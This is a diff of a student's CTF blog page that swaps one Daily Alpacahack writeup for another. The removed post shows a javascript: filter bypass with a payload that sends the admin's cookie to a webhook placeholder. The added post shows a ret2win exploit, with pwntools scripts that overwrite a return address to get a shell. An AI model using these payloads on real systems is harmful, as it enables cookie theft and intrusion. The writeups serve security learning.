@@ -32,42 +32,42 @@
     document.documentElement.setAttribute("data-theme", theme);
   })();
 </script>
-<title>You-Are-Being-Redirected – Writeup | 4mN3s14 | CTF Player &amp; Student</title>
+<title> Disappeared (Daily Alpacahack) Writeup | 4mN3s14 | CTF Player &amp; Student</title>
 <meta
   name="description"
   content="
-    You Are Being Redirected – Daily Aplacahack Writeup Category: Web (Client-Side)
-Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …
+    Disappeared — Daily Alpacahack Writeup Category: Pwn · Difficulty: Medium ·
+Overview We&rsquo;re given source code and a netcat address. The code looks safe at …
   
   ">
 
 
-  <meta name="keywords" content="open-redirect, client-side, url-parsing">
+  <meta name="keywords" content="ctf, pwn, binary exploitation, ret2win">
 
 
 
 
 
-<link rel="canonical" href="http://localhost:1313/myblog/posts/you-are-being-redirected/">
+<link rel="canonical" href="http://localhost:1313/myblog/posts/diappeared/">
 
 <meta name="robots" content="index, follow">
 
 
 <meta property="og:type" content="article">
-<meta property="og:title" content="You-Are-Being-Redirected – Writeup | 4mN3s14 | CTF Player &amp; Student">
-<meta property="og:description" content="You Are Being Redirected – Daily Aplacahack Writeup Category: Web (Client-Side)
-Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …">
-<meta property="og:url" content="http://localhost:1313/myblog/posts/you-are-being-redirected/">
+<meta property="og:title" content=" Disappeared (Daily Alpacahack) Writeup | 4mN3s14 | CTF Player &amp; Student">
+<meta property="og:description" content="Disappeared — Daily Alpacahack Writeup Category: Pwn · Difficulty: Medium ·
+Overview We&rsquo;re given source code and a netcat address. The code looks safe at …">
+<meta property="og:url" content="http://localhost:1313/myblog/posts/diappeared/">
 <meta property="og:site_name" content="4mN3s14 | CTF Player &amp; Student"><meta property="og:image" content="/myblog/images/logo.png">
   <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630"><meta property="article:published_time" content="2026-02-15T08:00:00Z">
+  <meta property="og:image:height" content="630"><meta property="article:published_time" content="2026-02-18T06:00:00Z">
   <meta
     property="article:modified_time"
-    content="2026-02-15T08:00:00Z"><meta property="article:section" content="open-redirect"><meta property="article:tag" content="open-redirect"><meta property="article:tag" content="client-side"><meta property="article:tag" content="url-parsing">
+    content="2026-02-18T06:00:00Z"><meta property="article:section" content="ctf"><meta property="article:tag" content="ctf"><meta property="article:tag" content="pwn"><meta property="article:tag" content="binary exploitation"><meta property="article:tag" content="ret2win">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="You-Are-Being-Redirected – Writeup | 4mN3s14 | CTF Player &amp; Student">
-<meta name="twitter:description" content="You Are Being Redirected – Daily Aplacahack Writeup Category: Web (Client-Side)
-Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …"><meta name="twitter:image" content="/myblog/images/logo.png"><meta name="twitter:site" content="@J0n4n1">
+<meta name="twitter:title" content=" Disappeared (Daily Alpacahack) Writeup | 4mN3s14 | CTF Player &amp; Student">
+<meta name="twitter:description" content="Disappeared — Daily Alpacahack Writeup Category: Pwn · Difficulty: Medium ·
+Overview We&rsquo;re given source code and a netcat address. The code looks safe at …"><meta name="twitter:image" content="/myblog/images/logo.png"><meta name="twitter:site" content="@J0n4n1">
   <meta name="twitter:creator" content="@J0n4n1">
 
 <script type="application/ld+json">
@@ -83,7 +83,7 @@ Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …
 
 
 
-"{\"@context\":\"https://schema.org\",\"@type\":\"BlogPosting\",\"author\":{\"@type\":\"Person\",\"email\":\"kagimujkar@gmail.com\",\"name\":\"4mN3s14 | CTF Player \\u0026 Student\"},\"dateModified\":\"2026-02-15T08:00:00Z\",\"datePublished\":\"2026-02-15T08:00:00Z\",\"description\":\"You Are Being Redirected – Daily Aplacahack Writeup Category: Web (Client-Side)\\nGoal: Exfiltrate the admin’s flag cookie using the redirect functionality. …\",\"headline\":\"You-Are-Being-Redirected – Writeup\",\"image\":\"/myblog/images/logo.png\",\"keywords\":[\"open-redirect\",\"client-side\",\"url-parsing\"],\"mainEntityOfPage\":{\"@id\":\"http://localhost:1313/myblog/posts/you-are-being-redirected/\",\"@type\":\"WebPage\"},\"publisher\":{\"@type\":\"Organization\",\"logo\":{\"@type\":\"ImageObject\",\"url\":\"/myblog/images/logo.png\"},\"name\":\"4mN3s14 | CTF Player \\u0026 Student\"}}"</script>
+"{\"@context\":\"https://schema.org\",\"@type\":\"BlogPosting\",\"author\":{\"@type\":\"Person\",\"email\":\"kagimujkar@gmail.com\",\"name\":\"4mN3s14 | CTF Player \\u0026 Student\"},\"dateModified\":\"2026-02-18T06:00:00Z\",\"datePublished\":\"2026-02-18T06:00:00Z\",\"description\":\"Disappeared — Daily Alpacahack Writeup Category: Pwn · Difficulty: Medium ·\\nOverview We\\u0026rsquo;re given source code and a netcat address. The code looks safe at …\",\"headline\":\" Disappeared (Daily Alpacahack) Writeup\",\"image\":\"/myblog/images/logo.png\",\"keywords\":[\"ctf\",\"pwn\",\"binary exploitation\",\"ret2win\"],\"mainEntityOfPage\":{\"@id\":\"http://localhost:1313/myblog/posts/diappeared/\",\"@type\":\"WebPage\"},\"publisher\":{\"@type\":\"Organization\",\"logo\":{\"@type\":\"ImageObject\",\"url\":\"/myblog/images/logo.png\"},\"name\":\"4mN3s14 | CTF Player \\u0026 Student\"}}"</script>
 
 
 
@@ -93,7 +93,7 @@ Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …
     
   
   
-<script type="application/ld+json">"{\"@context\":\"https://schema.org\",\"@type\":\"BreadcrumbList\",\"itemListElement\":[{\"@type\":\"ListItem\",\"item\":\"http://localhost:1313/myblog/\",\"name\":\"4mN3s14 | CTF Player \\u0026 Student\",\"position\":1},{\"@type\":\"ListItem\",\"item\":\"http://localhost:1313/myblog/posts/\",\"name\":\"Posts\",\"position\":2},{\"@type\":\"ListItem\",\"item\":\"http://localhost:1313/myblog/posts/you-are-being-redirected/\",\"name\":\"You-Are-Being-Redirected – Writeup\",\"position\":3}]}"</script>
+<script type="application/ld+json">"{\"@context\":\"https://schema.org\",\"@type\":\"BreadcrumbList\",\"itemListElement\":[{\"@type\":\"ListItem\",\"item\":\"http://localhost:1313/myblog/\",\"name\":\"4mN3s14 | CTF Player \\u0026 Student\",\"position\":1},{\"@type\":\"ListItem\",\"item\":\"http://localhost:1313/myblog/posts/\",\"name\":\"Posts\",\"position\":2},{\"@type\":\"ListItem\",\"item\":\"http://localhost:1313/myblog/posts/diappeared/\",\"name\":\" Disappeared (Daily Alpacahack) Writeup\",\"position\":3}]}"</script>
 
 
 
@@ -384,13 +384,13 @@ Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …
 
 
       <header class="post-header">
-        <h1 class="post-title-main">You-Are-Being-Redirected – Writeup</h1>
+        <h1 class="post-title-main"> Disappeared (Daily Alpacahack) Writeup</h1>
 
         
 
         <div class="post-meta">
   <div class="post-meta-info">
-    <time datetime="2026-02-15T08:00:00Z" class="post-date">
+    <time datetime="2026-02-18T06:00:00Z" class="post-date">
       <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
         <path
           stroke-linecap="round"
@@ -398,7 +398,7 @@ Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …
           stroke-width="2"
           d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
       </svg>
-      February 15, 2026
+      February 18, 2026
     </time>
 
     <span class="meta-separator">•</span>
@@ -412,7 +412,7 @@ Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …
             stroke-width="2"
             d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
         </svg>
-        146 words
+        742 words
       </span>
     
 
@@ -426,7 +426,7 @@ Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …
             stroke-width="2"
             d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
         </svg>
-        1 min
+        4 min
       </span>
     
   </div>
@@ -434,11 +434,13 @@ Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …
   
     <div class="post-tags">
       
-        <a href="http://localhost:1313/myblog/tags/open-redirect" class="post-tag">open-redirect</a>
+        <a href="http://localhost:1313/myblog/tags/ctf" class="post-tag">ctf</a>
       
-        <a href="http://localhost:1313/myblog/tags/client-side" class="post-tag">client-side</a>
+        <a href="http://localhost:1313/myblog/tags/pwn" class="post-tag">pwn</a>
       
-        <a href="http://localhost:1313/myblog/tags/url-parsing" class="post-tag">url-parsing</a>
+        <a href="http://localhost:1313/myblog/tags/binary-exploitation" class="post-tag">binary exploitation</a>
+      
+        <a href="http://localhost:1313/myblog/tags/ret2win" class="post-tag">ret2win</a>
       
     </div>
   
@@ -447,36 +449,154 @@ Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …
       </header>
 
       <div class="post-content-main">
-        <h2 id="you-are-being-redirected--daily-aplacahack-writeup">You Are Being Redirected – Daily Aplacahack Writeup</h2>
-<p><strong>Category:</strong> Web (Client-Side)<br>
-<strong>Goal:</strong> Exfiltrate the admin’s flag cookie using the redirect functionality.</p>
+        <h1 id="disappeared--daily-alpacahack-writeup">Disappeared — Daily Alpacahack Writeup</h1>
+<p><strong>Category:</strong> Pwn · <strong>Difficulty:</strong> Medium ·</p>
 <hr>
-<h3 id="overview">Overview</h3>
-<p>This challenge involves exploiting a client-side open redirect vulnerability in combination with an admin bot that visits user-supplied paths. The objective is to execute JavaScript in the context of the challenge origin and exfiltrate the administrator’s cookie containing the flag.</p>
-<h3 id="vulnerability">Vulnerability</h3>
-<p>The <code>/redirect?to=</code> endpoint attempts to block <code>javascript:</code> URLs using a string check such as:</p>
-<p><strong><code>to.includes(&quot;javascript:&quot;)</code></strong></p>
-<p>However, the destination is later parsed using the <code>URL()</code> constructor. The browser’s URL parser strips control characters like newline (<code>\n</code>, <code>%0a</code>) from the scheme.</p>
-<p>This allows a bypass:</p>
-<p><strong><code>java%0ascript:</code></strong></p>
-<ul>
-<li>
-<p><code>.includes(&quot;javascript:&quot;)</code> → does not match</p>
-</li>
-<li>
-<p><code>URL()</code> normalization → becomes <code>javascript:</code></p>
-</li>
-</ul>
-<p>As a result, JavaScript execution is possible.</p>
+<h2 id="overview">Overview</h2>
+<p>We&rsquo;re given source code and a netcat address. The code looks safe at first glance — there&rsquo;s a bounds check on the array index before any write. The trick is in the compile command:</p>
+<pre tabindex="0"><code>gcc -DNDEBUG -o chal main.c -no-pie
+</code></pre><p>Two flags matter: <code>-DNDEBUG</code> and <code>-no-pie</code>.</p>
 <hr>
-<h3 id="exploit">Exploit</h3>
-<p>Submit the following path to the admin bot:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#e6db74">`redirect?to=java%0ascript:fetch(&#39;https://webhook.site/ATTACKER_ID?flag=&#39;%2bdocument.cookie)`</span> 
-</span></span></code></pre></div><p>PAYLOAD:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">`</span>curl -X POST http://&lt;ADMIN_BOT&gt;/api/report <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{&#34;path&#34;:&#34;redirect?to=java%0ascript:fetch(&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;https://webhook.site/ATTACKER_ID?flag=&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;%2bdocument.cookie)&#34;}&#39;</span><span style="color:#e6db74">`</span> 
-</span></span></code></pre></div>
+<h2 id="the-vulnerability">The Vulnerability</h2>
+<h3 id="-dndebug-silently-deletes-assert"><code>-DNDEBUG</code> silently deletes <code>assert()</code></h3>
+<p>The C standard specifies that when <code>NDEBUG</code> is defined, every <code>assert()</code> call is <strong>completely removed by the preprocessor</strong> — not weakened, not skipped at runtime. Deleted.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Source code says:
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span>(pos <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// With -DNDEBUG, the preprocessor turns this into:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// (nothing)
+</span></span></span></code></pre></div><p>The challenge is literally called &ldquo;Disappeared&rdquo; because the bounds check disappears. <code>assert()</code> is a debugging tool, never a security primitive — the moment a production build defines <code>NDEBUG</code>, all your asserts vanish.</p>
+<p>With the check gone, <code>scanf(&quot;%u&quot;, &amp;num[pos])</code> will write a user-controlled <code>unsigned int</code> to <strong>any index</strong> relative to <code>num[0]</code> on the stack. One arbitrary relative write.</p>
+<h3 id="-no-pie-means-fixed-addresses"><code>-no-pie</code> means fixed addresses</h3>
+<p>No PIE means the binary loads at a fixed base every time. <code>win()</code> always lives at the same address — no ASLR to defeat, no leak needed.</p>
+<pre tabindex="0"><code>$ objdump -d chal | grep &#39;&lt;win&gt;&#39;
+00000000004011b6 &lt;win&gt;:
+</code></pre><p><code>win()</code> is at <code>0x4011b6</code>. Since the upper 32 bits are <code>0x00000000</code>, we only need a single 32-bit write to redirect execution.</p>
+<hr>
+<h2 id="stack-layout">Stack Layout</h2>
+<p>Breaking at <code>safe()</code> in GDB reveals the frame:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; b safe
+</span></span><span style="display:flex;"><span>pwndbg&gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RBP  0x7fffffffd9d0
+</span></span><span style="display:flex;"><span>RSP  0x7fffffffd820
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># From disassembly:</span>
+</span></span><span style="display:flex;"><span>0x40120c &lt;safe+50&gt;  lea rax, <span style="color:#f92672">[</span>rbp - 0x1a4<span style="color:#f92672">]</span>   <span style="color:#75715e"># &amp;pos</span>
+</span></span><span style="display:flex;"><span>0x4011f2 &lt;safe+24&gt;  mov qword ptr <span style="color:#f92672">[</span>rbp - 8<span style="color:#f92672">]</span>, rax  <span style="color:#75715e"># canary</span>
+</span></span></code></pre></div><p>Reconstructed layout:</p>
+<p>Address</p>
+<p>Contents</p>
+<p>Notes</p>
+<p><code>rbp + 0x008</code></p>
+<p>return address</p>
+<p>← target</p>
+<p><code>rbp + 0x000</code></p>
+<p>saved RBP</p>
+<p><code>rbp - 0x008</code></p>
+<p>stack canary</p>
+<p>⚠ must not corrupt</p>
+<p><code>rbp - 0x1a4</code></p>
+<p><code>pos</code></p>
+<p>first scanf reads here</p>
+<p><code>rbp - 0x1a8</code></p>
+<p><code>num[99]</code></p>
+<p>top of array</p>
+<p><code>rbp - 0x334</code></p>
+<p><code>num[0]</code></p>
+<p>base of array</p>
+<h3 id="calculating-the-target-index">Calculating the target index</h3>
+<pre tabindex="0"><code>pos    = rbp − 0x1a4 = rbp − 420
+num[0] = pos − (100 × 4) = rbp − 420 − 400 = rbp − 0x334
+ret    = rbp + 8
+
+distance = (rbp + 8) − (rbp − 0x334) = 0x33c = 828 bytes
+index    = 828 ÷ 4 = 207  (local)
+</code></pre>
+
+
+
+
+
+
+
+<blockquote class="blockquote-regular">
+  <p><strong>Note:</strong> The local calculation gives index 207, but the remote server has different environment variables which shift the stack slightly. The correct index needs to be confirmed against the remote.</p>
+
+</blockquote>
+<hr>
+<h2 id="canary--not-a-problem">Canary — Not a Problem</h2>
+<p>The binary has a stack canary, but this doesn&rsquo;t matter here. A canary defends against <em>sequential</em> overwrites (classic buffer overflows). Our write is a <strong>single targeted index write</strong> — we jump straight to the return address slot without touching anything between <code>num[0]</code> and it. The canary is untouched.</p>
+<hr>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="step-1--brute-the-remote-offset">Step 1 — Brute the remote offset</h3>
+<p>Index 207 didn&rsquo;t pop a shell locally (remote stack differs). A quick brute-forcer over the plausible range finds the right slot:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>WIN <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011b6</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> idx <span style="color:#f92672">in</span> list(range(<span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">116</span>)) <span style="color:#f92672">+</span> list(range(<span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">220</span>)):
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;34.170.146.252&#34;</span>, <span style="color:#ae81ff">40839</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pos &gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;val &gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(str(WIN)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;id&#34;</span>)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;uid=&#34;</span> <span style="color:#f92672">in</span> resp:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] SHELL at index </span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74">!&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>Output:</p>
+<pre tabindex="0"><code>[-] idx=100: b&#39;&#39;
+[-] idx=101: b&#39;&#39;
+[-] idx=102: b&#39;*** stack smashing detected ***: terminated\n&#39;
+[-] idx=103: b&#39;*** stack smashing detected ***: terminated\n&#39;
+[-] idx=104: b&#39;&#39;
+[-] idx=105: b&#39;&#39;
+[+] === SHELL at index 106! ===
+uid=999(pwn) gid=999(pwn) groups=999(pwn)
+</code></pre><p>Indices 102 and 103 hit the canary (confirming it exists and exactly where it is). Everything maps cleanly:</p>
+<p>Index</p>
+<p>What we hit</p>
+<p>Result</p>
+<p>102</p>
+<p>canary low 32 bits</p>
+<p>stack smashing detected</p>
+<p>103</p>
+<p>canary high 32 bits</p>
+<p>stack smashing detected</p>
+<p>104</p>
+<p>saved RBP low</p>
+<p>crash</p>
+<p>105</p>
+<p>saved RBP high</p>
+<p>crash</p>
+<p><strong>106</strong></p>
+<p><strong>return address low</strong></p>
+<p><strong>shell ✓</strong></p>
+<h3 id="step-2--clean-final-exploit">Step 2 — Clean final exploit</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>WIN <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011b6</span>   <span style="color:#75715e"># fixed — no PIE</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;34.170.146.252&#34;</span>, <span style="color:#ae81ff">40839</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pos &gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;106&#34;</span>)             <span style="color:#75715e"># return address slot</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;val &gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(str(WIN)<span style="color:#f92672">.</span>encode())  <span style="color:#75715e"># 4198838 decimal</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><code>win()</code> lives at <code>0x004011b6</code> — the upper 32 bits are already <code>0x00000000</code> on the stack, so one write is all it takes.</p>
+<hr>
+<h2 id="summary">Summary</h2>
+<p>The vulnerability is a real-world footgun: <code>assert()</code> is stripped by <code>-DNDEBUG</code> in production builds, silently removing the only bounds check. Combined with no PIE and a single clean write to the return address, this becomes a one-shot ret2win.</p>
+<p>The lesson: <strong>never use <code>assert()</code> for input validation</strong>. Use explicit <code>if</code> checks that survive in all build configurations.</p>
+
       </div>
 
       
@@ -484,11 +604,13 @@ Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …
           <div class="post-tags-footer">
             <span class="tags-label">Tags:</span>
             
-              <a href="http://localhost:1313/myblog/tags/open-redirect" class="post-tag">open-redirect</a>
+              <a href="http://localhost:1313/myblog/tags/ctf" class="post-tag">ctf</a>
             
-              <a href="http://localhost:1313/myblog/tags/client-side" class="post-tag">client-side</a>
+              <a href="http://localhost:1313/myblog/tags/pwn" class="post-tag">pwn</a>
             
-              <a href="http://localhost:1313/myblog/tags/url-parsing" class="post-tag">url-parsing</a>
+              <a href="http://localhost:1313/myblog/tags/binary-exploitation" class="post-tag">binary exploitation</a>
+            
+              <a href="http://localhost:1313/myblog/tags/ret2win" class="post-tag">ret2win</a>
             
           </div>
         </footer>
@@ -498,22 +620,14 @@ Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …
       <nav class="post-navigation" aria-label="Post navigation">
         
           <a
-            href="http://localhost:1313/myblog/posts/aes/"
+            href="http://localhost:1313/myblog/posts/you-are-being-redirected/"
             class="nav-link nav-prev"
-            aria-label="Previous post: AAAAAAAAEEEEEEEESSSSSSSS - CTF Writeup">
+            aria-label="Previous post: You-Are-Being-Redirected – Writeup">
             <span class="nav-label">Previous</span>
-            <span class="nav-title">AAAAAAAAEEEEEEEESSSSSSSS - CTF Writeup</span>
+            <span class="nav-title">You-Are-Being-Redirected – Writeup</span>
           </a>
         
 
-        
-          <a
-            href="http://localhost:1313/myblog/posts/diappeared/"
-            class="nav-link nav-next"
-            aria-label="Next post:  Disappeared (Daily Alpacahack) Writeup">
-            <span class="nav-label">Next</span>
-            <span class="nav-title"> Disappeared (Daily Alpacahack) Writeup</span>
-          </a>
         
       </nav>
     </article>
@@ -556,13 +670,26 @@ Goal: Exfiltrate the admin’s flag cookie using the redirect functionality. …
       <nav class="toc-nav" aria-label="Table of contents">
         <nav id="TableOfContents">
   <ul>
-    <li><a href="#you-are-being-redirected--daily-aplacahack-writeup">You Are Being Redirected – Daily Aplacahack Writeup</a>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#the-vulnerability">The Vulnerability</a>
       <ul>
-        <li><a href="#overview">Overview</a></li>
-        <li><a href="#vulnerability">Vulnerability</a></li>
-        <li><a href="#exploit">Exploit</a></li>
+        <li><a href="#-dndebug-silently-deletes-assert"><code>-DNDEBUG</code> silently deletes <code>assert()</code></a></li>
+        <li><a href="#-no-pie-means-fixed-addresses"><code>-no-pie</code> means fixed addresses</a></li>
       </ul>
     </li>
+    <li><a href="#stack-layout">Stack Layout</a>
+      <ul>
+        <li><a href="#calculating-the-target-index">Calculating the target index</a></li>
+      </ul>
+    </li>
+    <li><a href="#canary--not-a-problem">Canary — Not a Problem</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#step-1--brute-the-remote-offset">Step 1 — Brute the remote offset</a></li>
+        <li><a href="#step-2--clean-final-exploit">Step 2 — Clean final exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#summary">Summary</a></li>
   </ul>
 </nav>
       </nav>
